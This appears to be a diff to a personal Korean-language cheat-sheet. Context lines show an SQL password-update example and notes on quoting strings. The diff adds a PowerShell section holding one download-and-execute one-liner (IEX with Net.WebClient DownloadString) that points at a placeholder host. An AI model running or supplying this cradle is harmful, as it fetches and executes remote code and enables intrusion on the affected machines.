@@ -125,3 +125,8 @@ update planning_user set password ='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' wh
 ```
 - 문자는 ''로 감싸줘야 인식.
 - 감싸지 않으면 컬럼명으로 인식한다.
+---
+# powershell
+```powershell
+IEX(New-Object Net.WebClient).DownloadString("http://ip/file")
+```
